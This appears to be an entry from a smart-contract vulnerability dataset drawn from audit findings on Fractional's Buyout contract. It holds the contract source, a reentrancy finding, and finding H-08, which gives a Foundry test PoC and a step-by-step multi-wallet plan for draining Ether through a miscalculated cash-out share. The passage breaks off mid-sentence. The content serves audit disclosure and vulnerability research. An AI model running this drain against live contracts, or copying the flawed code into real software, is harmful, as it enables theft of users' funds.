                "Repair": "\nPrevent re-entrancy in the start function by using the nonReentrant modifier provided by OpenZeppelin's ReentrancyGuard(https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6ab8d6a67e3281ab062bdbe4df32b95c6409ee6d/contracts/security/ReentrancyGuard.sol) contract, or use an equivalent custom solution.\n\naklatham (Fractional) marked as duplicate and commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/306#issuecomment-1187749136):\n  Duplicate of #87(https://github.com/code-423n4/2022-07-fractional-findings/issues/87) \n\nsseefried (warden) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/306#issuecomment-1188841405):\n  This exploit is a duplicate of the others in most respects but there is one key difference. In the other submissions there is at least a chance that someone else will get in _their_ buyout bid after 4 days by carefully submitting a transaction at just the right moment. With the exploit I have outlined they cannot even do this. The call to end will automatically create a new buyout with no chance of anyone else ever getting their transaction in. It is a truly perpetual buyout. \n \n To see an executable PoC of this (using a malicious contract to ensure the perpetual buyout)  apply the diff in this gist(https://gist.github.com/sseefried/b198ecfc730fc5f829ee236132feda3a) and run\n \n \n $ forge test -m testPerpetualBuyoutBug\n \n\nstevennevins (Fractional) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/306#issuecomment-1189169657):\n  Thanks for the reply @sseefried! We felt this was the same underlying issue as #87 and others labeled as duplicates while having a more certain path to griefing.\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/306#issuecomment-1203250515):\n  Starting a buyout can result in assets being stuck in a contract. This submission shows how reentrancy can be used to make this even worse resulting in locking the assets up forever. This combination of concerns raises the issue to High risk.\n \n Selecting this submission as the primary for identifying this potential impact and including a coded POC.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IBuyout, Auction, State} from \"../interfaces/IBuyout.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {ISupply} from \"../interfaces/ISupply.sol\";\nimport {ITransfer} from \"../interfaces/ITransfer.sol\";\nimport {IVault} from \"../interfaces/IVault.sol\";\nimport {IVaultRegistry, Permission} from \"../interfaces/IVaultRegistry.sol\";\nimport {Multicall} from \"../utils/Multicall.sol\";\nimport {NFTReceiver} from \"../utils/NFTReceiver.sol\";\nimport {SafeSend} from \"../utils/SafeSend.sol\";\nimport {SelfPermit} from \"../utils/SelfPermit.sol\";\n\n/// @title Buyout\n/// @author Fractional Art\n/// @notice Module contract for vaults to hold buyout pools\n/// - A fractional owner starts an auction for a vault by depositing any amount of ether and fractional tokens into a pool.\n/// - During the proposal period (2 days) users can sell their fractional tokens into the pool for ether.\n/// - During the rejection period (4 days) users can buy fractional tokens from the pool with ether.\n/// - If a pool has more than 51% of the total supply after 4 days, the buyout is successful and the proposer\n///   gains access to withdraw the underlying assets (ERC20, ERC721, and ERC1155 tokens) from the vault.\n///   Otherwise the buyout is considered unsuccessful and a new one may then begin.\n/// - NOTE: A vault may only have one active buyout at any given time.\n/// - buyoutPrice = (ethDeposit * 100) / (100 - ((fractionDeposit * 100) / totalSupply))\n/// - buyoutShare = (tokenBalance * ethBalance) / (totalSupply + tokenBalance)\ncontract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n    /// @notice Address of VaultRegistry contract\n    address public registry;\n    /// @notice Address of Supply target contract\n    address public supply;\n    /// @notice Address of Transfer target contract\n    address public transfer;\n    /// @notice Time length of the proposal period\n    uint256 public constant PROPOSAL_PERIOD = 2 days;\n    /// @notice Time length of the rejection period\n    uint256 public constant REJECTION_PERIOD = 4 days;\n    /// @notice Mapping of vault address to auction struct\n    mapping(address => Auction) public buyoutInfo;\n\n    /// @notice Initializes registry, supply, and transfer contracts\n    constructor(\n        address _registry,\n        address _supply,\n        address _transfer\n    ) {\n        registry = _registry;\n        supply = _supply;\n        transfer = _transfer;\n    }\n\n    /// @dev Callback for receiving ether when the calldata is empty\n    receive() external payable {}\n\n    /// @notice Starts the auction for a buyout pool\n    /// @param _vault Address of the vault\n    function start(address _vault) external payable {\n        // Reverts if ether deposit amount is zero\n        if (msg.value == 0) revert ZeroDeposit();\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not inactive\n        (, , State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert InvalidState(required, current);\n\n        // Gets total supply of fractional tokens for the vault\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        // Gets total balance of fractional tokens owned by caller\n        uint256 depositAmount = IERC1155(token).balanceOf(msg.sender, id);\n\n        // Transfers fractional tokens into the buyout pool\n        IERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            depositAmount,\n            \"\"\n        );\n\n        // Calculates price of buyout and fractions\n        // @dev Reverts with division error if called with total supply of tokens\n        uint256 buyoutPrice = (msg.value * 100) /\n            (100 - ((depositAmount * 100) / totalSupply));\n        uint256 fractionPrice = buyoutPrice / totalSupply;\n\n        // Sets info mapping of the vault address to auction struct\n        buyoutInfo[_vault] = Auction(\n            block.timestamp,\n            msg.sender,\n            State.LIVE,\n            fractionPrice,\n            msg.value,\n            totalSupply\n        );\n        // Emits event for starting auction\n        emit Start(\n            _vault,\n            msg.sender,\n            block.timestamp,\n            buyoutPrice,\n            fractionPrice\n        );\n    }\n\n    /// @notice Sells fractional tokens in exchange for ether from a pool\n    /// @param _vault Address of the vault\n    /// @param _amount Transfer amount of fractions\n    function sellFractions(address _vault, uint256 _amount) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n            .buyoutInfo(_vault);\n        // Reverts if auction state is not live\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is greater than end time of proposal period\n        uint256 endTime = startTime + PROPOSAL_PERIOD;\n        if (block.timestamp > endTime)\n            revert TimeExpired(block.timestamp, endTime);\n\n        // Transfers fractional tokens to pool from caller\n        IERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            _amount,\n            \"\"\n        );\n\n        // Updates ether balance of pool\n        uint256 ethAmount = fractionPrice * _amount;\n        buyoutInfo[_vault].ethBalance -= ethAmount;\n        // Transfers ether amount to caller\n        _sendEthOrWeth(msg.sender, ethAmount);\n        // Emits event for selling fractions into pool\n        emit SellFractions(msg.sender, _amount);\n    }\n\n    /// @notice Buys fractional tokens in exchange for ether from a pool\n    /// @param _vault Address of the vault\n    /// @param _amount Transfer amount of fractions\n    function buyFractions(address _vault, uint256 _amount) external payable {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not live\n        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n            .buyoutInfo(_vault);\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is greater than end time of rejection period\n        uint256 endTime = startTime + REJECTION_PERIOD;\n        if (block.timestamp > endTime)\n            revert TimeExpired(block.timestamp, endTime);\n        // Reverts if payment amount does not equal price of fractional amount\n        if (msg.value != fractionPrice * _amount) revert InvalidPayment();\n\n        // Transfers fractional tokens to caller\n        IERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            _amount,\n            \"\"\n        );\n        // Updates ether balance of pool\n        buyoutInfo[_vault].ethBalance += msg.value;\n        // Emits event for buying fractions from pool\n        emit BuyFractions(msg.sender, _amount);\n    }\n\n    /// @notice Ends the auction for a live buyout pool\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function end(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not live\n        (\n            uint256 startTime,\n            address proposer,\n            State current,\n            ,\n            uint256 ethBalance,\n\n        ) = this.buyoutInfo(_vault);\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is less than or equal to end time of auction\n        uint256 endTime = startTime + REJECTION_PERIOD;\n        if (block.timestamp <= endTime)\n            revert TimeNotElapsed(block.timestamp, endTime);\n\n        uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);\n        // Checks totalSupply of auction pool to determine if buyout is successful or not\n        if (\n            (tokenBalance * 1000) /\n                IVaultRegistry(registry).totalSupply(_vault) >\n            500\n        ) {\n            // Initializes vault transaction\n            bytes memory data = abi.encodeCall(\n                ISupply.burn,\n                (address(this), tokenBalance)\n            );\n            // Executes burn of fractional tokens from pool\n            IVault(payable(_vault)).execute(supply, data, _burnProof);\n            // Sets buyout state to successful\n            buyoutInfo[_vault].state = State.SUCCESS;\n            // Emits event for ending successful auction\n            emit End(_vault, State.SUCCESS, proposer);\n        } else {\n            // Deletes auction info\n            delete buyoutInfo[_vault];\n            // Transfers fractions and ether back to proposer of the buyout pool\n            IERC1155(token).safeTransferFrom(\n                address(this),\n                proposer,\n                id,\n                tokenBalance,\n                \"\"\n            );\n            _sendEthOrWeth(proposer, ethBalance);\n            // Emits event for ending unsuccessful auction\n            emit End(_vault, State.INACTIVE, proposer);\n        }\n    }\n\n    /// @notice Cashes out proceeds from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function cash(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not successful\n        (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);\n        State required = State.SUCCESS;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if caller has a balance of zero fractional tokens\n        uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);\n        if (tokenBalance == 0) revert NoFractions();\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ISupply.burn,\n            (msg.sender, tokenBalance)\n        );\n        // Executes burn of fractional tokens from caller\n        IVault(payable(_vault)).execute(supply, data, _burnProof);\n\n        // Transfers buyout share amount to caller based on total supply\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        uint256 buyoutShare = (tokenBalance * ethBalance) /\n            (totalSupply + tokenBalance);\n        _sendEthOrWeth(msg.sender, buyoutShare);\n        // Emits event for cashing out of buyout pool\n        emit Cash(_vault, msg.sender, buyoutShare);\n    }\n\n    /// @notice Terminates a vault with an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function redeem(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not inactive\n        (, , State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert InvalidState(required, current);\n\n        // Initializes vault transaction\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        bytes memory data = abi.encodeCall(\n            ISupply.burn,\n            (msg.sender, totalSupply)\n        );\n        // Executes burn of fractional tokens from caller\n        IVault(payable(_vault)).execute(supply, data, _burnProof);\n\n        // Sets buyout state to successful and proposer to caller\n        (buyoutInfo[_vault].state, buyoutInfo[_vault].proposer) = (\n            State.SUCCESS,\n            msg.sender\n        );\n        // Emits event for redeem underlying assets from the vault\n        emit Redeem(_vault, msg.sender);\n    }\n\n    /// @notice Withdraws an ERC-20 token from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _value Transfer amount\n    /// @param _erc20TransferProof Merkle proof for transferring an ERC-20 token\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] calldata _erc20TransferProof\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not successful\n        (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.SUCCESS;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if caller is not the auction winner\n        if (msg.sender != proposer) revert NotWinner();\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC20Transfer,\n            (_token, _to, _value)\n        );\n        // Executes transfer of ERC721 token to caller\n        IVault(payable(_vault)).execute(transfer, data, _erc20TransferProof);\n    }\n\n    /// @notice Withdraws an ERC-721 token from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _tokenId ID of the token\n    /// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] calldata _erc721TransferProof\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not successful\n        (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.SUCCESS;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if caller is not the auction winner\n        if (msg.sender != proposer) revert NotWinner();\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC721TransferFrom,\n            (_token, _vault, _to, _tokenId)\n        );\n        // Executes transfer of ERC721 token to caller\n        IVault(payable(_vault)).execute(transfer, data, _erc721TransferProof);\n    }\n\n    /// @notice Withdraws an ERC-1155 token from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _id ID of the token type\n    /// @param _value Transfer amount\n    /// @param _erc1155TransferProof Merkle proof for transferring an ERC-1155 token\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] calldata _erc1155TransferProof\n    ) external {\n        // Creates local scope to avoid stack too deep\n        {\n            // Reverts if address is not a registered vault\n            (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n            if (id == 0) revert NotVault(_vault);\n            // Reverts if auction state is not successful\n            (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n            State required = State.SUCCESS;\n            if (current != required) revert InvalidState(required, current);\n            // Reverts if caller is not the auction winner\n            if (msg.sender != proposer) revert NotWinner();\n        }\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC1155TransferFrom,\n            (_token, _vault, _to, _id, _value)\n        );\n        // Executes transfer of ERC1155 token to caller\n        IVault(payable(_vault)).execute(transfer, data, _erc1155TransferProof);\n    }\n\n    /// @notice Batch withdraws ERC-1155 tokens from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _ids IDs of each token type\n    /// @param _values Transfer amounts per token type\n    /// @param _erc1155BatchTransferProof Merkle proof for transferring multiple ERC-1155 tokens\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] calldata _ids,\n        uint256[] calldata _values,\n        bytes32[] calldata _erc1155BatchTransferProof\n    ) external {\n        // Creates local scope to avoid stack too deep\n        {\n            // Reverts if address is not a registered vault\n            (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n            if (id == 0) revert NotVault(_vault);\n            // Reverts if auction state is not successful\n            (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n            State required = State.SUCCESS;\n            if (current != required) revert InvalidState(required, current);\n            // Reverts if caller is not the auction winner\n            if (msg.sender != proposer) revert NotWinner();\n        }\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC1155BatchTransferFrom,\n            (_token, _vault, _to, _ids, _values)\n        );\n        // Executes batch transfer of multiple ERC1155 tokens to caller\n        IVault(payable(_vault)).execute(\n            transfer,\n            data,\n            _erc1155BatchTransferProof\n        );\n    }\n\n    /// @notice Gets the list of leaf nodes used to generate a merkle tree\n    /// @dev Leaf nodes are hashed permissions of the merkle tree\n    /// @return nodes Hashes of leaf nodes\n    function getLeafNodes() external view returns (bytes32[] memory nodes) {\n        nodes = new bytes32[](5);\n        // Gets list of permissions from this module\n        Permission[] memory permissions = getPermissions();\n        for (uint256 i; i < permissions.length; ) {\n            // Hashes permission into leaf node\n            nodes[i] = keccak256(abi.encode(permissions[i]));\n            // Can't overflow since loop is a fixed size\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /// @notice Gets the list of permissions installed on a vault\n    /// @dev Permissions consist of a module contract, target contract, and function selector\n    /// @return permissions List of vault permissions\n    function getPermissions()\n        public\n        view\n        returns (Permission[] memory permissions)\n    {\n        permissions = new Permission[](5);\n        // Burn function selector from supply contract\n        permissions[0] = Permission(\n            address(this),\n            supply,\n            ISupply(supply).burn.selector\n        );\n        // ERC20Transfer function selector from transfer contract\n        permissions[1] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC20Transfer.selector\n        );\n        // ERC721TransferFrom function selector from transfer contract\n        permissions[2] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC721TransferFrom.selector\n        );\n        // ERC1155TransferFrom function selector from transfer contract\n        permissions[3] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC1155TransferFrom.selector\n        );\n        // ERC1155BatchTransferFrom function selector from transfer contract\n        permissions[4] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC1155BatchTransferFrom.selector\n        );\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IModule} from \"./IModule.sol\";\nimport {Permission} from \"./IVaultRegistry.sol\";\n\n/// @dev Possible states that a buyout auction may have\nenum State {\n    INACTIVE,\n    LIVE,\n    SUCCESS\n}\n\n/// @dev Auction information\nstruct Auction {\n    // Time of when buyout begins\n    uint256 startTime;\n    // Address of proposer creating buyout\n    address proposer;\n    // Enum state of the buyout auction\n    State state;\n    // Price of fractional tokens\n    uint256 fractionPrice;\n    // Balance of ether in buyout pool\n    uint256 ethBalance;\n    // Total supply recorded before a buyout started\n    uint256 lastTotalSupply;\n}\n\n/// @dev Interface for Buyout module contract\ninterface IBuyout is IModule {\n    /// @dev Emitted when the payment amount does not equal the fractional price\n    error InvalidPayment();\n    /// @dev Emitted when the buyout state is invalid\n    error InvalidState(State _required, State _current);\n    /// @dev Emitted when the caller has no balance of fractional tokens\n    error NoFractions();\n    /// @dev Emitted when the caller is not the winner of an auction\n    error NotWinner();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when the time has expired for selling and buying fractions\n    error TimeExpired(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when the buyout auction is still active\n    error TimeNotElapsed(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when ether deposit amount for starting a buyout is zero\n    error ZeroDeposit();\n\n    /// @dev Event log for starting a buyout\n    /// @param _vault Address of the vault\n    /// @param _proposer Address that created the buyout\n    /// @param _startTime Timestamp of when buyout was created\n    /// @param _buyoutPrice Price of buyout pool in ether\n    /// @param _fractionPrice Price of fractional tokens\n    event Start(\n        address indexed _vault,\n        address indexed _proposer,\n        uint256 _startTime,\n        uint256 _buyoutPrice,\n        uint256 _fractionPrice\n    );\n    /// @dev Event log for selling fractional tokens into the buyout pool\n    /// @param _seller Address selling fractions\n    /// @param _amount Transfer amount being sold\n    event SellFractions(address indexed _seller, uint256 _amount);\n    /// @dev Event log for buying fractional tokens from the buyout pool\n    /// @param _buyer Address buying fractions\n    /// @param _amount Transfer amount being bought\n    event BuyFractions(address indexed _buyer, uint256 _amount);\n    /// @dev Event log for ending an active buyout\n    /// @param _vault Address of the vault\n    /// @param _state Enum state of auction\n    /// @param _proposer Address that created the buyout\n    event End(address _vault, State _state, address indexed _proposer);\n    /// @dev Event log for cashing out ether for fractions from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _casher Address cashing out of buyout\n    /// @param _amount Transfer amount of ether\n    event Cash(address _vault, address indexed _casher, uint256 _amount);\n    /// @dev Event log for redeeming the underlying vault assets from an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _redeemer Address redeeming underlying assets\n    event Redeem(address _vault, address indexed _redeemer);\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function REJECTION_PERIOD() external view returns (uint256);\n\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] memory _ids,\n        uint256[] memory _values,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyFractions(address _vault, uint256 _amount) external payable;\n\n    function buyoutInfo(address)\n        external\n        view\n        returns (\n            uint256 startTime,\n            address proposer,\n            State state,\n            uint256 fractionPrice,\n            uint256 ethBalance,\n            uint256 lastTotalSupply\n        );\n\n    function cash(address _vault, bytes32[] memory _burnProof) external;\n\n    function end(address _vault, bytes32[] memory _burnProof) external;\n\n    function getLeafNodes() external view returns (bytes32[] memory nodes);\n\n    function getPermissions()\n        external\n        view\n        returns (Permission[] memory permissions);\n\n    function redeem(address _vault, bytes32[] memory _burnProof) external;\n\n    function registry() external view returns (address);\n\n    function sellFractions(address _vault, uint256 _amount) external;\n\n    function start(address _vault) external payable;\n\n    function supply() external view returns (address);\n\n    function transfer() external view returns (address);\n\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] memory _erc1155TransferProof\n    ) external;\n}\n\n\n",
        "CodeNames": [
            "Buyout.sol",
            "IBuyout.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-08",
                "Location": [
                    "//solidity\nfunction testCashDrainEther() public {\n  /// ==================\n  /// ===== SETUP =====\n  /// ==================\n\n  deployBaseVault(alice, TOTAL_SUPPLY);\n  (token, tokenId) = registry.vaultToToken(vault);\n  alice.ferc1155 = new FERC1155BS(address(0), 111, token);\n  bob.ferc1155 = new FERC1155BS(address(0), 222, token);\n  eve.ferc1155 = new FERC1155BS(address(0), 333, token);\n\n  buyout = address(buyoutModule);\n  proposalPeriod = buyoutModule.PROPOSAL_PERIOD();\n  rejectionPeriod = buyoutModule.REJECTION_PERIOD();\n\n  vm.label(vault, \"VaultProxy\");\n  vm.label(token, \"Token\");\n\n  setApproval(alice, vault, true);\n  setApproval(alice, buyout, true);\n  setApproval(bob, vault, true);\n  setApproval(bob, buyout, true);\n  setApproval(eve, vault, true);\n  setApproval(eve, buyout, true);\n\n  alice.ferc1155.safeTransferFrom(\n      alice.addr,\n      bob.addr,\n      1,\n      6000,\n      \"\"\n  );\n\n  alice.ferc1155.safeTransferFrom(\n      alice.addr,\n      eve.addr,\n      1,\n      2000,\n      \"\"\n  );\n  /// ==================\n  /// ===== SETUP END =====\n  /// ==================\n\n  /// Fraction balances:\n  assertEq(getFractionBalance(alice.addr), 2000); // Alice: 2000\n  assertEq(getFractionBalance(bob.addr), 6000); // Bob: 6000\n  assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000\n\n  bob.buyoutModule.start{value: 10 ether}(vault);\n\n  assertEq(getETHBalance(buyout), 10 ether);\n\n  /// Bob (proposer of buyout) transfered his fractions to buyout contract\n  assertEq(getFractionBalance(buyout), 6000);\n\n  vm.warp(rejectionPeriod + 1);\n\n  bob.buyoutModule.end(vault, burnProof);\n\n  /// Fraction balances after buyout ended:\n  assertEq(getFractionBalance(alice.addr), 2000);  // Alice: 2000\n  assertEq(getFractionBalance(bob.addr), 0); // Bob: 0\n  assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000\n\n  assertEq(getETHBalance(buyout), 10 ether);\n\n  /// Alice cashes out 2000 fractions - 5 ETH (correct amount)\n  alice.buyoutModule.cash(vault, burnProof);\n\n  assertEq(getFractionBalance(alice.addr), 0);\n  assertEq(getETHBalance(alice.addr), 105 ether);\n\n  /// Eve cashes out 2000 fractions - REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETH\n  eve.buyoutModule.cash(vault, burnProof);\n}\n"
                ],
                "Type": " Cash-out from a successful buyout allows an attacker to drain Ether from the  Buyout  contract",
                "Description": "\nThe function Buyout.cash allows a user to cash out proceeds (Ether) from a successful vault buyout.\n\nHowever, due to how buyoutShare is calculated in Buyout.cash, users (fractional vault token holders) cashing out would receive more Ether than they are entitled to. The calculation is wrong as it uses the initial Ether balance stored in buyoutInfo[_vault].ethBalance. Each consecutive cash-out will lead to a user receiving more Ether, ultimately draining the Ether funds of the Buyout contract.\n\n\nCopy paste the following test case into Buyout.t.sol and run the test via forge test -vvv --match-test testCashDrainEther:\n\nThe test shows how 2 users Alice and Eve cash out Ether from a successful vault buyout (which brought in 10 ether). Alice and Eve are both entitled to receive 5 ether each. Alice receives the correct amount when cashing out, however, due to a miscalculation of buyoutShare (see #L268-L269(https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269)), Eve can cash-out 10 ether from the Buyout contract.\n\nsolidity\nfunction testCashDrainEther() public {\n  /// ==================\n  /// ===== SETUP =====\n  /// ==================\n\n  deployBaseVault(alice, TOTAL_SUPPLY);\n  (token, tokenId) = registry.vaultToToken(vault);\n  alice.ferc1155 = new FERC1155BS(address(0), 111, token);\n  bob.ferc1155 = new FERC1155BS(address(0), 222, token);\n  eve.ferc1155 = new FERC1155BS(address(0), 333, token);\n\n  buyout = address(buyoutModule);\n  proposalPeriod = buyoutModule.PROPOSAL_PERIOD();\n  rejectionPeriod = buyoutModule.REJECTION_PERIOD();\n\n  vm.label(vault, \"VaultProxy\");\n  vm.label(token, \"Token\");\n\n  setApproval(alice, vault, true);\n  setApproval(alice, buyout, true);\n  setApproval(bob, vault, true);\n  setApproval(bob, buyout, true);\n  setApproval(eve, vault, true);\n  setApproval(eve, buyout, true);\n\n  alice.ferc1155.safeTransferFrom(\n      alice.addr,\n      bob.addr,\n      1,\n      6000,\n      \"\"\n  );\n\n  alice.ferc1155.safeTransferFrom(\n      alice.addr,\n      eve.addr,\n      1,\n      2000,\n      \"\"\n  );\n  /// ==================\n  /// ===== SETUP END =====\n  /// ==================\n\n  /// Fraction balances:\n  assertEq(getFractionBalance(alice.addr), 2000); // Alice: 2000\n  assertEq(getFractionBalance(bob.addr), 6000); // Bob: 6000\n  assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000\n\n  bob.buyoutModule.start{value: 10 ether}(vault);\n\n  assertEq(getETHBalance(buyout), 10 ether);\n\n  /// Bob (proposer of buyout) transfered his fractions to buyout contract\n  assertEq(getFractionBalance(buyout), 6000);\n\n  vm.warp(rejectionPeriod + 1);\n\n  bob.buyoutModule.end(vault, burnProof);\n\n  /// Fraction balances after buyout ended:\n  assertEq(getFractionBalance(alice.addr), 2000);  // Alice: 2000\n  assertEq(getFractionBalance(bob.addr), 0); // Bob: 0\n  assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000\n\n  assertEq(getETHBalance(buyout), 10 ether);\n\n  /// Alice cashes out 2000 fractions - 5 ETH (correct amount)\n  alice.buyoutModule.cash(vault, burnProof);\n\n  assertEq(getFractionBalance(alice.addr), 0);\n  assertEq(getETHBalance(alice.addr), 105 ether);\n\n  /// Eve cashes out 2000 fractions - REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETH\n  eve.buyoutModule.cash(vault, burnProof);\n}\n\n\nAdditionally to the demonstrated PoC in the test case, an attacker could intentionally create vaults with many wallets and exploit the vulnerability:\n\n1.  Attacker deploys a vault with 10.000 fractions minted\n2.  51% of fractions (5.100) are kept in the main wallet, all other fractions are distributed to 5 other self-controlled wallets (Wallets 1-5, 980 fractions each)\n3.  With the first wallet, the attacker starts a buyout with 10 ether fractions are transferred into the Buyout contract as well as 10 ether\n4.  Attacker waits for REJECTION_PERIOD to elapse to call Buyout.end (51% of fractions are already held in the contract, therefore no need for voting)\n5.  After the successful buyout, the attacker uses the Buyout.cash function to cash out each wallet. Each subsequent cash-out will lead to receiving more Ether, thus stealing Ether from the Buyout contract:\n    1.  Wallet 1 buyoutShare = (980 * 10 ) / (3920 + 980) = 2 ether (totalSupply = 3920 after burning 980 fractions from wallet 1)\n    2.  Wallet 2 buyoutShare = (980 * 10 ) / (2940 + 980) = 2.5 ether (totalSupply = 2940 after burning 980 fractions from wallet 2)\n    3.  Wallet 3 buyoutShare = (980 * 10 ) / (1960 + 980) = ~3.3 ether (totalSupply = 1960 after burning 980 fractions from wallet 3)\n    4.  Wallet 4 buyoutShare = (980 * 10 ) / (980 + 980) = 5 ether (totalSupply = 980 after burning 980 fractions from wallet 4)\n    5.  Wallet 5 buyoutShare = (980 * 10 ) / (0 + 980) = 10 ether (totalSupply = 0 after burning 980 fractions from wallet 5)\n\nIf summed up, cashing out the 5 wallets, the attacker receives 22.8 